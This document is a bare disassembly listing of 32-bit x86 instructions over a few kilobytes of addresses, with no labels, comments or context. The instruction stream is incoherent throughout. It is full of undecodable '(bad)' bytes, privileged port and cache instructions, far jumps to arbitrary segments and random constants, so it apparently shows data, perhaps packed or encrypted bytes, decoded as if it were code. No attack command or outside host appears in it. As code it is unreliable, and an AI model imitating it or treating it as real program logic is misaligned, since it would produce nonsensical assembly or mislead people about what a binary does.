  41c03b:	mov    esp,0x9a3941bd
  41c040:	sub    eax,0xa4a6d7ff
  41c045:	pusha  
  41c046:	inc    ebx
  41c047:	ret    0x5564
  41c04a:	xchg   dh,al
  41c04c:	mov    cl,BYTE PTR [ebp-0x39]
  41c04f:	js     0x41c0b0
  41c051:	(bad)  
  41c052:	jae    0x41c08e
  41c054:	xchg   edx,esi
  41c056:	repnz mov ah,BYTE PTR [ebx+0x208b598e]
  41c05d:	loop   0x41c054
  41c05f:	stos   DWORD PTR es:[edi],eax
  41c060:	into   
  41c061:	lock mov DWORD PTR [eax+0x4484d243],ebx
  41c068:	dec    ecx
  41c069:	sar    DWORD PTR [ebp*4-0x7dbc462c],cl
  41c070:	cmp    ch,BYTE PTR [ebx+0x32]
  41c073:	pop    edi
  41c074:	mov    dh,BYTE PTR [edi-0x69]
  41c077:	push   es
  41c078:	shl    esp,0xe4
  41c07b:	(bad)  
  41c07c:	(bad)  [esi+edi*8-0x614df4e5]
  41c083:	add    cl,bh
  41c085:	or     ah,0xe0
  41c088:	repz mov dl,0xab
  41c08b:	in     al,0x54
  41c08d:	pop    eax
  41c08e:	xchg   edx,eax
  41c08f:	enter  0xb602,0x9a
  41c093:	inc    edi
  41c094:	ror    DWORD PTR [eax],1
  41c096:	vpcomuw xmm4,xmm3,XMMWORD PTR [ecx+ebx*2-0x35b7c019],0xc4
  41c0a1:	push   es
  41c0a2:	loope  0x41c065
  41c0a4:	test   BYTE PTR [ecx-0x51],0xd8
  41c0a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0a9:	sub    dh,ch
  41c0ab:	xchg   edi,eax
  41c0ac:	or     BYTE PTR [edx],dl
  41c0ae:	sbb    eax,0x1936c8d4
  41c0b3:	dec    ebp
  41c0b4:	stos   BYTE PTR es:[edi],al
  41c0b5:	cmp    esp,DWORD PTR [edx-0x18]
  41c0b8:	psraw  mm6,QWORD PTR [edi]
  41c0bb:	lock adc DWORD PTR [ecx-0x17a97243],esp
  41c0c2:	cmovns edx,DWORD PTR [esi-0x59]
  41c0c6:	dec    ecx
  41c0c7:	sahf   
  41c0c8:	push   0xccf86f56
  41c0cd:	adc    al,0x3c
  41c0cf:	xchg   ebx,eax
  41c0d0:	or     DWORD PTR ds:0xb833ff23,ebx
  41c0d6:	daa    
  41c0d7:	push   es
  41c0d8:	lea    ebp,[eax+edi*8+0x1c1c4875]
  41c0df:	(bad)
  41c0e2:	sbb    ecx,DWORD PTR [edi]
  41c0e4:	fisub  DWORD PTR [ebx-0x3729cda]
  41c0ea:	mov    esi,DWORD PTR [edx-0x9]
  41c0ed:	mov    esp,0x3f45ce2d
  41c0f2:	(bad)  
  41c0f3:	dec    edx
  41c0f4:	popa   
  41c0f5:	push   ds
  41c0f6:	cmc    
  41c0f7:	jne    0x41c160
  41c0f9:	sub    ax,0x310
  41c0fd:	test   DWORD PTR [ebx+0x7a538cd],edx
  41c103:	int3   
  41c104:	jl     0x41c0cf
  41c106:	int3   
  41c107:	(bad)  
  41c108:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c109:	fwait
  41c10a:	jg     0x41c17a
  41c10c:	out    dx,eax
  41c10d:	mov    DWORD PTR [esi],edx
  41c10f:	mov    ebp,0xec
	...
  41c174:	(bad)  [edx-0x5f]
  41c177:	clc    
  41c178:	mov    bl,0xfb
  41c17a:	fldcw  WORD PTR [ebx+0x3d]
  41c17d:	add    DWORD PTR ds:0x2171b2e9,eax
  41c183:	pop    edx
  41c184:	(bad)
  41c188:	add    eax,0xf3000001
  41c18d:	mov    ah,cl
  41c18f:	ds xchg ebp,eax
  41c191:	xchg   edx,eax
  41c192:	dec    esp
  41c193:	add    ebp,ecx
  41c195:	jg     0x41c178
  41c197:	test   al,0x23
  41c199:	mov    esi,0xe569dbe6
  41c19e:	mov    bh,0xc3
  41c1a0:	mov    bl,0xa
  41c1a2:	in     eax,dx
  41c1a3:	fdivr  DWORD PTR [ebx+eiz*8+0x8]
  41c1a7:	cli    
  41c1a8:	adc    edx,esp
  41c1aa:	test   BYTE PTR [edx-0x27689ec0],al
  41c1b0:	add    cl,BYTE PTR [edi+ebp*1]
  41c1b3:	mov    BYTE PTR [edi+0x30e8f302],0xcb
  41c1ba:	ficom  DWORD PTR [ebx]
  41c1bc:	je     0x41c186
  41c1be:	es pop esi
  41c1c0:	aad    0xcc
  41c1c2:	fdivrp st(0),st
  41c1c4:	mov    edx,0x289b06f2
  41c1c9:	(bad)  
  41c1ca:	cmp    eax,0x987fea78
  41c1cf:	lods   al,BYTE PTR fs:[esi]
  41c1d1:	aaa    
  41c1d2:	xor    ch,BYTE PTR ds:0x37141d71
  41c1d8:	and    ah,bl
  41c1da:	jcxz   0x41c21c
  41c1dd:	iret   
  41c1de:	in     al,dx
  41c1df:	push   edx
  41c1e0:	fistp  QWORD PTR [ecx+0x40]
  41c1e3:	xor    ah,BYTE PTR [edx-0x2c]
  41c1e6:	mov    dh,0xb2
  41c1e8:	mov    bh,0xa7
  41c1ea:	or     al,0xea
  41c1ec:	rcr    bh,cl
  41c1ee:	push   es
  41c1ef:	pop    edi
  41c1f0:	loope  0x41c239
  41c1f2:	xchg   ebx,eax
  41c1f3:	mov    edi,0x49163355
  41c1f8:	and    al,0xc7
  41c1fa:	push   edx
  41c1fb:	sbb    bl,dh
  41c1fd:	repnz cdq 
  41c1ff:	frstor [edx-0x23528c31]
  41c205:	add    dl,al
  41c207:	repz push ecx
  41c209:	mov    ds:0xf7901b0d,al
  41c20e:	loopne 0x41c222
  41c210:	xchg   ebp,eax
  41c211:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c212:	inc    edi
  41c213:	mov    DWORD PTR [edi],ebx
  41c215:	and    DWORD PTR ds:0x9124dbf4,esi
  41c21b:	into   
  41c21c:	inc    ecx
  41c21d:	ins    BYTE PTR es:[edi],dx
  41c21e:	sub    BYTE PTR [ebp+0x6ff4ba36],cl
  41c224:	sbb    eax,0x13dd5f2c
  41c229:	pop    ax
  41c22b:	or     BYTE PTR [eax+ebx*8-0x1],al
  41c22f:	adc    eax,ebx
  41c231:	jno    0x41c217
  41c233:	pop    es
  41c234:	mov    ch,0xcd
  41c236:	out    0xab,eax
  41c238:	iret   
  41c239:	pushf  
  41c23a:	cmp    BYTE PTR ds:0x6af8c83a,ch
  41c240:	cs xchg ebx,eax
  41c242:	adc    al,0xe7
  41c244:	jle    0x41c27c
  41c246:	sub    eax,0xa0cf19d8
  41c24b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c24c:	sub    bh,BYTE PTR [ebp-0x78]
  41c24f:	pop    ds
  41c250:	push   ds
  41c251:	jecxz  0x41c278
  41c253:	int    0xbf
  41c255:	mov    edx,DWORD PTR [edi]
  41c257:	fldenv [edx+eiz*1]
  41c25a:	fwait
  41c25b:	sbb    edi,eax
  41c25d:	mov    WORD PTR [ecx+0x170b316c],?
  41c263:	nop
  41c264:	fist   WORD PTR [edx]
  41c266:	cmp    al,0x5e
  41c268:	dec    ebx
  41c269:	fst    DWORD PTR [ecx-0x31]
  41c26c:	aad    0x92
  41c26e:	pushf  
  41c26f:	mov    ah,0x9e
  41c271:	xor    BYTE PTR [ecx],bl
  41c273:	mov    ecx,0x51f91e6d
  41c278:	out    dx,al
  41c279:	loop   0x41c228
  41c27b:	adc    ch,bl
  41c27d:	icebp  
  41c27e:	push   ds
  41c27f:	out    0x3,eax
  41c281:	ins    BYTE PTR es:[edi],dx
  41c282:	(bad)  
  41c283:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c284:	je     0x41c22f
  41c286:	cmp    ah,dl
  41c288:	ss cld 
  41c28a:	sub    eax,0x439a9796
  41c28f:	dec    ebx
  41c290:	rol    DWORD PTR [eax],0x0
	...
  41c2f3:	add    bl,dh
  41c2f5:	and    ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	pop    ebx
  41c301:	in     al,dx
  41c302:	cdq    
  41c303:	call   0x105:0x12b94
  41c30a:	add    BYTE PTR [eax],al
  41c30c:	ins    BYTE PTR es:[edi],dx
  41c30d:	mov    cs,WORD PTR [ecx+0x2479af3]
  41c313:	je     0x41c2ed
  41c315:	xchg   ebx,ecx
  41c317:	xor    BYTE PTR [eax],0xab
  41c31a:	lods   al,BYTE PTR ds:[esi]
  41c31b:	dec    esp
  41c31c:	inc    ebx
  41c31d:	mov    ds:0xe45b8798,eax
  41c322:	xchg   esi,eax
  41c323:	mov    bh,0xb
  41c325:	push   ds
  41c326:	clc    
  41c327:	jmp    ecx
  41c329:	dec    edi
  41c32a:	loopne 0x41c345
  41c32c:	test   eax,0x8d3a26e7
  41c331:	and    esi,DWORD PTR [esi+0x248acfe8]
  41c337:	jecxz  0x41c35c
  41c339:	add    ah,bl
  41c33b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c33c:	sbb    BYTE PTR [edi+ebx*2-0x45],0x5a
  41c341:	pop    eax
  41c342:	xchg   al,bh
  41c344:	shr    esi,1
  41c346:	inc    eax
  41c348:	clc    
  41c349:	pop    esp
  41c34a:	xchg   ebx,eax
  41c34b:	mov    ah,0xd8
  41c34d:	sbb    DWORD PTR [ebp-0x340194f5],ecx
  41c353:	(bad)  
  41c354:	mov    ebp,0x4ed02c3d
  41c359:	out    0x5c,al
  41c35b:	jecxz  0x41c2df
  41c35d:	nop
  41c35e:	push   edx
  41c35f:	mov    esp,0xe0db4f14
  41c364:	mov    ds:0xdd929701,al
  41c369:	scas   al,BYTE PTR es:[edi]
  41c36a:	arpl   WORD PTR ds:0x235f5bb6,bx
  41c370:	add    bh,0x35
  41c373:	jmp    0x48ef:0x4605253b
  41c37a:	sbb    bh,BYTE PTR ds:0xc9408474
  41c380:	and    eax,0xe79ea338
  41c385:	or     ch,BYTE PTR [edx]
  41c387:	fcom   DWORD PTR ds:0xf99a0d69
  41c38d:	pop    edx
  41c38e:	mov    esp,0x47786092
  41c393:	pop    ds
  41c394:	push   esi
  41c395:	dec    esp
  41c396:	pop    esi
  41c397:	pop    ecx
  41c398:	jg     0x41c32a
  41c39a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c39b:	and    edi,DWORD PTR [edx+0x54]
  41c39e:	imul   ecx,DWORD PTR [edx-0x3e31006f],0x477e090f
  41c3a8:	push   ecx
  41c3a9:	push   0xffffffa1
  41c3ab:	dec    eax
  41c3ac:	adc    al,0x5
  41c3ae:	push   cs
  41c3af:	and    eax,0xa9ea7d98
  41c3b4:	ja     0x41c3c6
  41c3b6:	(bad)  
  41c3b7:	lahf   
  41c3b8:	inc    edi
  41c3b9:	add    ebp,DWORD PTR [eax+0x4baa87e]
  41c3bf:	imul   ebp,ecx,0x52
  41c3c2:	cmp    edi,DWORD PTR [esi-0x34]
  41c3c5:	mov    bl,0xcb
  41c3c7:	dec    ecx
  41c3c8:	out    0xb9,al
  41c3ca:	fucom  st(6)
  41c3cc:	pop    es
  41c3cd:	adc    dh,BYTE PTR [esi]
  41c3cf:	xchg   ecx,eax
  41c3d0:	push   es
  41c3d1:	add    DWORD PTR [esi+ebp*4],esp
  41c3d4:	imul   ebp,eax,0x999551a6
  41c3da:	mov    ebx,0x6e4aa35e
  41c3df:	pop    ecx
  41c3e0:	enter  0xab26,0x11
  41c3e4:	nop
  41c3e5:	mov    edi,0x48943470
  41c3ea:	xchg   DWORD PTR [edi-0x34],ecx
  41c3ed:	ror    esi,1
  41c3ef:	stc    
  41c3f0:	add    al,0x51
  41c3f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3f3:	mov    bh,0x8b
  41c3f5:	mov    cl,bl
  41c3f7:	loop   0x41c441
  41c3f9:	ins    DWORD PTR es:[edi],dx
  41c3fa:	shr    DWORD PTR [ebx+0x33],0x4c
  41c3fe:	or     al,0x98
  41c400:	jmp    0x40f2:0x6e1dd494
  41c407:	test   BYTE PTR [esi],dh
  41c409:	mov    cl,0xa4
  41c40b:	rcr    BYTE PTR [edi+0x12],0x54
  41c40f:	(bad)  [ebp+0x0]
	...
  41c472:	add    BYTE PTR [eax],al
  41c474:	push   ebx
  41c475:	and    BYTE PTR [eax+0x5faef3ae],ah
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c481:	sbb    eax,0x2c992b3b
  41c486:	add    DWORD PTR [eax],eax
  41c488:	add    eax,0x6e000001
  41c48d:	sti    
  41c48e:	fisttp DWORD PTR [eax+ebx*4+0x7]
  41c492:	mov    WORD PTR [eax+ecx*1],gs
  41c495:	popa   
  41c496:	ss das 
  41c498:	jmp    0x41c4bc
  41c49a:	xor    eax,0xe08c597d
  41c49f:	imul   BYTE PTR [ebx]
  41c4a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4a2:	nop
  41c4a3:	pop    ebp
  41c4a4:	mov    eax,ds:0xa9e80bd0
  41c4a9:	leave  
  41c4aa:	sbb    BYTE PTR [ebx+0x1c],bh
  41c4ad:	jmp    0xffe9cc86
  41c4b2:	inc    eax
  41c4b3:	mov    BYTE PTR [eax+edi*8],al
  41c4b6:	ror    BYTE PTR [eax+0x56],0x72
  41c4ba:	mov    ebx,0xda4fb36
  41c4bf:	mov    ds:0x6d6327ff,al
  41c4c4:	repz cmp al,0x73
  41c4c7:	jne    0x41c4ff
  41c4c9:	fidivr DWORD PTR [edi]
  41c4cb:	add    al,0x7a
  41c4cd:	or     ch,BYTE PTR [ebp+edi*4+0x12]
  41c4d1:	dec    ebx
  41c4d2:	lds    ecx,FWORD PTR [ecx+0x6f]
  41c4d5:	add    ecx,edx
  41c4d7:	add    esp,DWORD PTR [ecx-0x6c]
  41c4da:	inc    esi
  41c4db:	in     eax,dx
  41c4dc:	mov    ebp,0x8738d54e
  41c4e1:	in     eax,dx
  41c4e2:	addr16 adc eax,0xe08e10c8
  41c4e8:	add    BYTE PTR [esp+esi*2-0x60bd3f4f],ch
  41c4ef:	mov    WORD PTR [edi-0x54],ds
  41c4f2:	aas    
  41c4f3:	xchg   edi,eax
  41c4f4:	retf   0x7fe5
  41c4f7:	inc    eax
  41c4f8:	das    
  41c4f9:	sub    edx,edx
  41c4fb:	ins    DWORD PTR es:[edi],dx
  41c4fc:	mov    DWORD PTR [edx],ebp
  41c4fe:	sub    esi,edi
  41c500:	mov    ebp,edx
  41c502:	sbb    DWORD PTR [edi-0x7671f67d],0x28
  41c509:	dec    ebp
  41c50a:	adc    al,0x7b
  41c50c:	mov    cl,0x8f
  41c50e:	inc    ecx
  41c50f:	jle    0x41c4ce
  41c511:	sub    DWORD PTR [eax-0x6ca6d5cd],ebx
  41c517:	retf   
  41c518:	enter  0xd40c,0xc9
  41c51c:	pop    ebx
  41c51d:	adc    eax,0x4f6b7fb0
  41c522:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c523:	adc    eax,0xbf324262
  41c528:	sbb    BYTE PTR [ecx-0x47],al
  41c52b:	sbb    esi,edi
  41c52d:	jp     0x41c51c
  41c52f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c530:	retf   
  41c531:	cmp    DWORD PTR [edx+edx*2+0x5e9a8b5a],ecx
  41c538:	xor    BYTE PTR [edi+0x48],ch
  41c53b:	mov    ch,0x92
  41c53d:	adc    BYTE PTR [edi-0x50c04e7e],dl
  41c543:	and    DWORD PTR [ebp-0x1f51956a],esi
  41c549:	inc    esp
  41c54a:	mov    eax,ss
  41c54c:	or     BYTE PTR [esi],0xa7
  41c54f:	inc    esi
  41c550:	pop    esi
  41c551:	je     0x41c5a3
  41c553:	aad    0x78
  41c555:	mov    esp,0xebc6b1f3
  41c55a:	mov    ebp,0xe6bb2cd7
  41c55f:	jmp    0xe340bb8c
  41c564:	push   edx
  41c565:	mov    edx,0xa786848a
  41c56a:	popa   
  41c56b:	jo     0x41c5ac
  41c56d:	push   ecx
  41c56e:	leave  
  41c56f:	xor    DWORD PTR [ebx+0x1fd09ccd],ebx
  41c575:	jno    0x41c4fe
  41c577:	mov    ecx,0xe0f96136
  41c57c:	test   BYTE PTR [edi],dl
  41c57e:	cmp    BYTE PTR ss:[ebx-0x5],0x35
  41c583:	aam    0x78
  41c585:	jns    0x41c5ab
  41c587:	stc    
  41c588:	add    eax,0x9a2f0d62
  41c58d:	mov    esp,0x3a039b
	...
  41c5f2:	add    BYTE PTR [eax],al
  41c5f4:	lds    esp,FWORD PTR [ebx]
  41c5f6:	xchg   ecx,eax
  41c5f7:	and    eax,0xe3f5b7f7
  41c5fc:	inc    ebx
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d9e:0xa9f47810
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    eax,0x13000001
  41c60d:	dec    edi
  41c60e:	fcom   DWORD PTR [eax-0x5df35f00]
  41c614:	cmp    cl,BYTE PTR [ebx+ebx*2+0x66]
  41c618:	dec    esp
  41c619:	jg     0x41c665
  41c61b:	adc    al,0x5
  41c61d:	jl     0x41c670
  41c61f:	imul   ebx,edx,0x54444bf7
  41c625:	jbe    0x41c675
  41c627:	adc    dl,BYTE PTR [ebp+0x4b]
  41c62a:	shl    al,1
  41c62c:	adc    al,0x30
  41c62e:	ins    BYTE PTR es:[edi],dx
  41c62f:	and    BYTE PTR [edi],dh
  41c631:	lock push edi
  41c633:	(bad)  
  41c634:	xor    bl,ch
  41c636:	fbld   TBYTE PTR es:[eax+0x4646fba1]
  41c63d:	bound  eax,QWORD PTR [ebx+0x7d]
  41c640:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c641:	mov    ah,0xdd
  41c643:	ror    esi,1
  41c645:	adc    DWORD PTR [edx-0x6b4bbade],edi
  41c64b:	xor    al,0x2c
  41c64d:	(bad)  
  41c64e:	mov    ebp,0x6557b372
  41c653:	mov    ebx,0xc5a9e31d
  41c658:	(bad)  
  41c659:	sbb    bx,bp
  41c65c:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41c65e:	aad    0xa0
  41c660:	mov    al,ds:0x30179cb7
  41c665:	retf   0x5998
  41c668:	mov    dl,dh
  41c66a:	ss popa 
  41c66c:	out    dx,al
  41c66d:	mov    eax,ds:0x1987f2dd
  41c672:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c673:	aad    0xd4
  41c675:	mov    ch,0x26
  41c677:	mov    edx,DWORD PTR [ebp+0x35]
  41c67a:	lods   eax,DWORD PTR ds:[esi]
  41c67b:	js     0x41c677
  41c67d:	pop    ss
  41c67e:	jmp    0x45a19e97
  41c683:	loopne 0x41c677
  41c685:	or     al,0x46
  41c687:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c688:	es jns 0x41c688
  41c68b:	xchg   ebp,eax
  41c68c:	stos   BYTE PTR es:[edi],al
  41c68d:	iret   
  41c68e:	cs retf 
  41c690:	push   ebp
  41c691:	or     DWORD PTR ds:0xeb12d63a,0xffffffca
  41c698:	(bad)  
  41c699:	not    DWORD PTR [eax-0x7c2bbdbe]
  41c69f:	jno    0x41c66a
  41c6a1:	adc    edi,esi
  41c6a3:	into   
  41c6a4:	or     BYTE PTR [ebp-0x6bb2784c],dl
  41c6aa:	lods   eax,DWORD PTR ds:[esi]
  41c6ab:	ret    0xe43f
  41c6ae:	dec    edi
  41c6af:	xor    BYTE PTR [esi-0x11],bh
  41c6b2:	add    edx,0x42dd2e5e
  41c6b8:	mov    ds:0x484171b3,al
  41c6bd:	sub    al,0x6
  41c6bf:	mov    ebx,0xbc819ba5
  41c6c4:	jg     0x41c6d7
  41c6c6:	fs clc 
  41c6c8:	xlat   BYTE PTR ds:[ebx]
  41c6c9:	push   eax
  41c6ca:	adc    ah,BYTE PTR [esi-0x37]
  41c6cd:	mov    esi,0x120be493
  41c6d2:	xchg   ebp,eax
  41c6d3:	repz clc 
  41c6d5:	jmp    0x7fa0:0x7ba5a0d3
  41c6dc:	push   ebp
  41c6dd:	rcr    BYTE PTR [esi-0x7852269a],cl
  41c6e3:	cmp    BYTE PTR [eax+0xe9b72ee],al
  41c6e9:	xor    eax,0xebbcfe79
  41c6ee:	stc    
  41c6ef:	mov    edi,0xfd3cb259
  41c6f4:	push   ebp
  41c6f5:	mov    ds:0x7801b3e9,eax
  41c6fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6fb:	mov    al,ds:0x3f2ad464
  41c700:	cdq    
  41c701:	pop    ebp
  41c702:	popf   
  41c703:	xchg   edx,eax
  41c704:	mov    ds:0x170bc32b,eax
  41c709:	sub    eax,0x568a9503
  41c70e:	push   0x619b
	...
  41c773:	add    dl,bl
  41c775:	add    edx,eax
  41c777:	xchg   bl,bl
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	loop   0x41c7e1
  41c782:	pop    ebx
  41c783:	nop
  41c784:	mov    ds:0x500012e,eax
  41c789:	add    DWORD PTR [eax],eax
  41c78b:	add    BYTE PTR [ebx+0x38b1aa96],al
  41c791:	aas    
  41c792:	push   ebx
  41c793:	inc    edx
  41c794:	test   al,0xd6
  41c796:	enter  0x301a,0x38
  41c79a:	pop    ds
  41c79b:	mov    ds:0x7674dc60,eax
  41c7a0:	test   eax,0x1c5dce6f
  41c7a5:	cdq    
  41c7a6:	iret   
  41c7a7:	loope  0x41c7a2
  41c7a9:	(bad)  
  41c7aa:	adc    al,0xb5
  41c7ac:	xor    BYTE PTR [edi-0x7da7f432],cl
  41c7b2:	gs add eax,0xbf684045
  41c7b8:	in     al,0x2d
  41c7ba:	or     edi,0x8bb3c6af
  41c7c0:	mov    ds:0x96be8ea4,eax
  41c7c5:	cmp    ebp,DWORD PTR [ecx+0x65d1e8fd]
  41c7cb:	fs int 0x68
  41c7ce:	mov    eax,0xcef450fa
  41c7d3:	mov    esp,DWORD PTR [ecx-0x16]
  41c7d6:	jle    0x41c7a7
  41c7d8:	loope  0x41c830
  41c7da:	add    al,0x59
  41c7dc:	mov    ebx,0xeea49e6f
  41c7e1:	sbb    BYTE PTR [edi],ah
  41c7e3:	dec    esp
  41c7e4:	fld    DWORD PTR [ebp+0x1c613bc1]
  41c7ea:	mov    ah,BYTE PTR [ecx]
  41c7ec:	dec    ecx
  41c7ed:	adc    dh,dl
  41c7ef:	xchg   BYTE PTR [eax],cl
  41c7f1:	in     al,dx
  41c7f2:	daa    
  41c7f3:	dec    eax
  41c7f4:	pop    edx
  41c7f5:	outs   dx,BYTE PTR ds:[esi]
  41c7f6:	push   0x71
  41c7f8:	xchg   BYTE PTR [eax+eax*2-0x61c86684],al
  41c7ff:	outs   dx,DWORD PTR ds:[esi]
  41c800:	not    BYTE PTR [eax-0x4f]
  41c803:	out    0xf2,al
  41c805:	test   DWORD PTR [edx],esp
  41c807:	sar    BYTE PTR [ecx+eax*2-0x7405a30f],1
  41c80e:	add    eax,0x396ed530
  41c813:	add    al,0x55
  41c815:	adc    al,0x20
  41c817:	sub    eax,0x686d06a7
  41c81c:	les    ebx,FWORD PTR [ecx-0x50691186]
  41c822:	pop    ss
  41c823:	dec    edi
  41c824:	mov    dh,BYTE PTR [ebp+0x1b3977a0]
  41c82a:	xor    al,0x92
  41c82c:	repnz fstp TBYTE PTR [edi+0x581a9817]
  41c833:	mov    dh,0x37
  41c835:	cmp    al,0x28
  41c837:	test   eax,0x7ec873eb
  41c83c:	icebp  
  41c83d:	mov    ah,BYTE PTR [edx+0x5b]
  41c840:	or     dh,BYTE PTR [ebp+0x71]
  41c843:	cmp    edx,eax
  41c845:	(bad)  [eax+0x4544225b]
  41c84b:	xchg   BYTE PTR [edx+0x48],bh
  41c84e:	ja     0x41c8bc
  41c850:	std    
  41c851:	in     eax,dx
  41c852:	js     0x41c856
  41c854:	inc    eax
  41c855:	mov    DWORD PTR [ecx+0x6f],eax
  41c858:	adc    BYTE PTR [eax+0x6ee25361],0x2c
  41c85f:	leave  
  41c860:	mov    ebp,0x34e5759
  41c865:	aam    0x54
  41c867:	inc    ebp
  41c868:	int    0x30
  41c86a:	lods   eax,DWORD PTR ds:[esi]
  41c86b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c86c:	pop    ss
  41c86d:	inc    edx
  41c86e:	jno    0x41c849
  41c870:	(bad)  
  41c871:	mov    edi,0xa503bd91
  41c876:	dec    ecx
  41c877:	shl    DWORD PTR cs:[edi-0x528c733c],0x9e
  41c87f:	and    BYTE PTR [ebx],0x17
  41c882:	xchg   esp,eax
  41c883:	pushf  
  41c884:	iret   
  41c885:	imul   esi,DWORD PTR [ebx],0x1c
  41c888:	leave  
  41c889:	dec    edi
  41c88a:	in     eax,dx
  41c88b:	xchg   cl,al
  41c88d:	pop    ebx
  41c88e:	jns    0x41c90a
  41c890:	ins    BYTE PTR es:[edi],dx
	...
  41c8f1:	add    BYTE PTR [eax],al
  41c8f3:	add    BYTE PTR [ebx+0x34],ah
  41c8f6:	lods   eax,DWORD PTR ds:[esi]
  41c8f7:	xor    al,0xff
  41c8f9:	mov    ebp,0x291877fb
  41c8fe:	cmp    eax,DWORD PTR [ecx]
  41c900:	mov    ah,0x67
  41c902:	mov    eax,0x12fa822
  41c907:	add    BYTE PTR ds:0xd4000001,al
  41c90d:	jb     0x41c8b9
  41c90f:	call   0x1e6f:0xc6a58660
  41c916:	or     eax,0x15c5a996
  41c91b:	(bad)  
  41c91c:	loope  0x41c90b
  41c91e:	outs   dx,DWORD PTR ds:[esi]
  41c91f:	pop    eax
  41c920:	pop    edi
  41c921:	mov    edx,DWORD PTR [eax-0x5e]
  41c924:	jbe    0x41c94d
  41c926:	daa    
  41c927:	repnz and DWORD PTR [eax+0x31],ecx
  41c92b:	lock das 
  41c92d:	imul   DWORD PTR [ebx-0x2ad0f55c]
  41c933:	aas    
  41c934:	or     eax,0x88abf66
  41c939:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c93a:	add    BYTE PTR [ebp-0x50],bl
  41c93d:	dec    ebx
  41c93e:	cmp    eax,ecx
  41c940:	stos   BYTE PTR es:[edi],al
  41c941:	stos   DWORD PTR es:[edi],eax
  41c942:	add    cl,BYTE PTR [esp+ebp*4+0x70]
  41c946:	(bad)  
  41c947:	retf   0x6f82
  41c94a:	mov    bl,0x23
  41c94c:	add    al,0xa3
  41c94e:	nop
  41c94f:	std    
  41c950:	fsubr  QWORD PTR [eax+0x6aa03421]
  41c956:	pop    ds
  41c957:	(bad)  
  41c959:	add    ch,cl
  41c95b:	xchg   bl,dl
  41c95d:	push   es
  41c95e:	pop    ecx
  41c95f:	cli    
  41c960:	shl    BYTE PTR [ecx],cl
  41c962:	inc    edi
  41c963:	loop   0x41c95f
  41c965:	add    DWORD PTR ds:0xd7976633,eax
  41c96b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c96c:	mov    edx,0x75f971a3
  41c971:	jo     0x41c9e8
  41c973:	push   0x9d6df946
  41c978:	mov    al,ds:0x66b8df38
  41c97d:	pop    ebp
  41c97e:	pop    es
  41c97f:	lods   eax,DWORD PTR ds:[esi]
  41c980:	ficomp DWORD PTR [esi]
  41c982:	fistp  WORD PTR ds:0x65666280
  41c988:	pop    esi
  41c989:	aas    
  41c98a:	inc    eax
  41c98b:	wbinvd 
  41c98d:	push   edx
  41c98e:	dec    ebx
  41c98f:	adc    DWORD PTR [edx+0x8],0x97f6cb74
  41c996:	adc    ebp,0x885d8925
  41c99c:	sar    BYTE PTR [ebp-0x2bc24795],cl
  41c9a2:	xor    DWORD PTR [ecx+0x22a5e7e4],edi
  41c9a8:	dec    edi
  41c9a9:	jp     0x41c974
  41c9ab:	pop    edx
  41c9ac:	add    eax,0xfe1fd23f
  41c9b1:	lds    ebx,FWORD PTR [edi]
  41c9b3:	daa    
  41c9b4:	mov    BYTE PTR [edi+0x79],dh
  41c9b7:	clc    
  41c9b8:	clc    
  41c9b9:	dec    esi
  41c9ba:	cwde   
  41c9bb:	cli    
  41c9bc:	daa    
  41c9bd:	jns    0x41c9a9
  41c9bf:	mov    BYTE PTR [ecx],cl
  41c9c1:	jmp    0x9bf5:0xeef4e361
  41c9c8:	ss xchg esi,eax
  41c9ca:	inc    ebp
  41c9cb:	cmp    BYTE PTR [eax-0x3a11ecb1],dh
  41c9d1:	fcomp  DWORD PTR [ecx-0x4af31245]
  41c9d7:	jle    0x41ca57
  41c9d9:	addr16 pop ss
  41c9db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9dc:	mov    dh,0x3
  41c9de:	repz dec edi
  41c9e0:	cmp    esp,esp
  41c9e2:	and    ah,ah
  41c9e4:	pusha  
  41c9e5:	pop    edi
  41c9e6:	jl     0x41c984
  41c9e8:	shl    DWORD PTR [ecx+0x0],cl
  41c9eb:	pop    edi
  41c9ec:	xor    DWORD PTR [ecx+0x670492b7],edx
  41c9f2:	or     al,0x4
  41c9f4:	pop    es
  41c9f5:	jne    0x41ca47
  41c9f7:	jbe    0x41c9ec
  41c9f9:	adc    bl,dl
  41c9fb:	jle    0x41c9f9
  41c9fd:	add    al,0xb1
  41c9ff:	nop
  41ca00:	sub    edi,DWORD PTR [edi+ebp*2+0x21]
  41ca04:	scas   eax,DWORD PTR es:[edi]
  41ca05:	test   BYTE PTR [esi-0x54],bh
  41ca08:	add    DWORD PTR [ecx+0x6c],ecx
  41ca0b:	jg     0x41ca07
  41ca0d:	rcl    DWORD PTR [ebx],0x61
